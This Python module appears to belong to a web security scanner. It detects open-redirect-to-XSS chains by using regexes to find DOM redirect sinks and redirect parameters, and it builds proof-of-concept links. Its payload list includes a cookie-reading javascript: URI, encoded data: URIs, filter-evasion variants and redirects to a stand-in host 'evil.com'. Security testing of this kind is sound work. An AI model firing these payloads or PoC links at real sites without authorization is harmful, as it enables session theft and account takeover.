"""Open Redirect -> XSS chain detection.

An open redirect is a parameter that takes a URL and bounces the browser
to it (``/r?url=...`` -> ``302 Location: ...``).  On its own it is
"only" a redirect, but it becomes XSS when the redirect target is a
``javascript:`` or ``data:text/html`` URI -- the browser executes the
URI in the victim origin's context.

Two flavors:

  1. **Server-side open redirect** -- the server reads ``?url=...`` and
     emits a ``302 Location: javascript:alert(1)``.  Some servers reject
     ``javascript:`` but accept ``data:`` or ``//evil.com/`` (which can
     host a script gadget).  Testing a payload chain is essential.

  2. **DOM-based redirect sink** -- client-side JS reads a query param
     and assigns it to a redirect sink::

         location        = params.get('next');
         location.href   = params.get('return');
         location.assign(params.get('goto'));
         location.replace(params.get('dest'));
         window.open(params.get('url'));

     If the param value is ``javascript:alert(1)``, the assignment
     executes the JS.  DOM-based redirects are not constrained by the
     server's URL validation, so they are often the more reliable XSS
     vector.

Exploitation:

  * Find an open redirect param (``url``, ``redirect``, ``next``, ...).
  * Test ``javascript:alert(1)`` directly.  If rejected, try
    ``data:text/html,<script>alert(1)</script>`` or ``//evil.com/xss``.
  * Build a PoC link::

        <a href="https://victim.example/r?url=javascript:alert(1)">click</a>

This module:

  1. Lists common redirect parameter names.
  2. Scans page HTML for DOM-based redirect sinks fed by user input.
  3. Detects redirect params referenced in the page (link hrefs, form
     actions, inline scripts).
  4. Builds PoC links that turn the open redirect into XSS.
"""
from __future__ import annotations
import re
from urllib.parse import urlencode


# Common open-redirect parameter names seen in real-world apps.
REDIRECT_PARAMS: list[str] = [
    "url", "redirect", "next", "return", "returnTo", "goto",
    "target", "dest", "destination", "continue", "to", "rurl",
    "redirect_url", "redirect_uri",
]


# DOM-based redirect sinks.  Each entry: (regex, severity, description).
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'\blocation\s*=\s*[^;\n]', "high",
     "location = <user input> (DOM redirect)"),
    (r'\blocation\s*\.\s*href\s*[\+\-\*\/]?=\s*[^;\n]', "high",
     "location.href = <user input>"),
    (r'\blocation\s*\.\s*assign\s*\(', "high",
     "location.assign(<user input>)"),
    (r'\blocation\s*\.\s*replace\s*\(', "high",
     "location.replace(<user input>)"),
    (r'\bwindow\s*\.\s*open\s*\(', "high",
     "window.open(<user input>)"),
    (r'\blocation\s*\.\s*search\s*[\+\-\*\/]?=\s*[^;\n]', "medium",
     "location.search = <user input>"),
    (r'\blocation\s*\.\s*hash\s*[\+\-\*\/]?=\s*[^;\n]', "medium",
     "location.hash = <user input>"),
    (r'document\s*\.\s*location\s*=\s*[^;\n]', "high",
     "document.location = <user input>"),
    (r'\btop\s*\.\s*location\s*=', "medium",
     "top.location = <user input> (frame breakout)"),
    (r'\bself\s*\.\s*location\s*=', "medium",
     "self.location = <user input>"),
]

SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)


# Indicators that a snippet references user-controlled input: query
# string, hash, URLSearchParams, document.URL, window.location.
USER_INPUT_RE = re.compile(
    r'location\s*\.\s*(?:search|hash|href)'
    r'|searchParams\s*\.\s*get'
    r'|new\s+URLSearchParams'
    r'|document\s*\.\s*URL'
    r'|window\s*\.\s*location',
    re.IGNORECASE,
)


# Match ``?param=`` or ``&param=`` for any of the REDIRECT_PARAMS, so we
# can spot redirect params referenced in hrefs / scripts.
PARAM_REF_RE = re.compile(
    r'[?&](?:' + "|".join(re.escape(p) for p in REDIRECT_PARAMS) + r')=',
    re.IGNORECASE,
)


# Match ``<a href="...">`` and ``<form action="...">`` to find redirect
# params referenced in link targets.
LINK_HREF_RE = re.compile(
    r'<(?:a|form)\b[^>]*\b(?:href|action)\s*=\s*["\']?([^"\'>\s]+)',
    re.IGNORECASE,
)


def redirect_params() -> list[str]:
    """Return the list of common open-redirect parameter names."""
    return list(REDIRECT_PARAMS)


def find_redirect_sinks(html_or_js: str) -> list[dict]:
    """Find DOM-based redirect sinks in the page/script.

    Returns a list of dicts::

        {
            "snippet":         str,        # ~400 char context
            "sink":            str,        # human-readable sink description
            "user_controlled": bool,       # snippet references user input
            "exploitable":     bool,       # sink fed by user input
        }
    """
    if not html_or_js:
        return []
    out: list[dict] = []
    # Extract <script> blocks if HTML; treat raw JS as one block.
    blocks = [m.group(1) for m in re.finditer(
        r'<script[^>]*>(.*?)</script>', html_or_js,
        re.IGNORECASE | re.DOTALL)]
    if not blocks:
        blocks = [html_or_js]
    for block in blocks:
        for m in SINK_RE.finditer(block):
            start = max(0, m.start() - 60)
            end = min(len(block), m.end() + 200)
            snippet = block[start:end]
            user_controlled = bool(USER_INPUT_RE.search(snippet))
            sinks_found = [desc for pat, _, desc in DANGER_SINKS
                           if re.search(pat, snippet, re.IGNORECASE)]
            desc = sinks_found[0] if sinks_found else "redirect sink"
            out.append({
                "snippet": snippet.strip()[:400],
                "sink": desc,
                "user_controlled": user_controlled,
                "exploitable": user_controlled,
            })
    return out


def find_redirect_param_refs(html: str) -> list[str]:
    """Find redirect params referenced in the page.

    Scans ``<a href>`` / ``<form action>`` URLs and any inline ``?param=``
    pattern for the canonical redirect parameter names.

    Returns: list of canonical param names actually present in the page
    (deduplicated, case-normalized to the canonical form).
    """
    if not html:
        return []
    found: list[str] = []
    # Look in hrefs/actions for redirect params.
    for m in LINK_HREF_RE.finditer(html):
        url = m.group(1)
        for p in REDIRECT_PARAMS:
            pat = re.compile(r'[?&]' + re.escape(p) + r'=', re.IGNORECASE)
            if pat.search(url) and p not in found:
                found.append(p)
    # Look anywhere for ``?param=`` / ``&param=`` patterns referencing
    # redirect params; normalize case to the canonical name.
    for m in PARAM_REF_RE.finditer(html):
        seg = html[m.start():m.end()].lstrip('?&').rstrip('=')
        for p in REDIRECT_PARAMS:
            if p.lower() == seg.lower() and p not in found:
                found.append(p)
                break
    return found


def analyze_page(html: str) -> dict:
    """Analyze a page for Open-Redirect -> XSS issues.

    Returns::

        {
            "has_redirect_sink":      bool,        # any redirect sink found
            "redirect_params_found":  list[str],   # params referenced in page
            "exploitable":            bool,        # sink fed by user input
            "sinks":                  list[dict],  # exploitable sinks only
        }
    """
    if not html:
        return {
            "has_redirect_sink": False,
            "redirect_params_found": [],
            "exploitable": False,
            "sinks": [],
        }
    sinks = find_redirect_sinks(html)
    params = find_redirect_param_refs(html)
    exploitable_sinks = [s for s in sinks if s["exploitable"]]
    return {
        "has_redirect_sink": bool(sinks),
        "redirect_params_found": params,
        "exploitable": bool(exploitable_sinks),
        "sinks": exploitable_sinks,
    }


def build_poc_link(
    target_url: str,
    param: str,
    payload: str = "javascript:alert(1)",
) -> str:
    """Build a PoC ``<a>`` link that turns the open redirect into XSS.

    The link, when clicked, hits ``target_url?param=<payload>``.  If the
    server (or DOM sink) honors the payload as a redirect target, the
    ``javascript:`` URI executes in the victim origin.
    """
    sep = "&" if "?" in target_url else "?"
    poc_url = f"{target_url}{sep}{urlencode({param: payload})}"
    return f'<a href="{poc_url}">click</a>'


def dangerous_payloads() -> list[str]:
    """High-yield payloads for Open-Redirect -> XSS testing."""
    return [
        # javascript: URI -- the primary XSS-via-redirect payload
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "javascript:eval(atob('YWxlcnQoMSk='))",
        # data: URI -- often accepted when javascript: is filtered
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # Protocol-relative -- bounces to an attacker host serving a script
        "//evil.com/xss",
        "https://evil.com/xss",
        # Mixed-case / encoded bypasses for naive filters
        "JaVaScRiPt:alert(1)",
        "javascript&colon;alert(1)",
        "javascript%3aalert(1)",
    ]
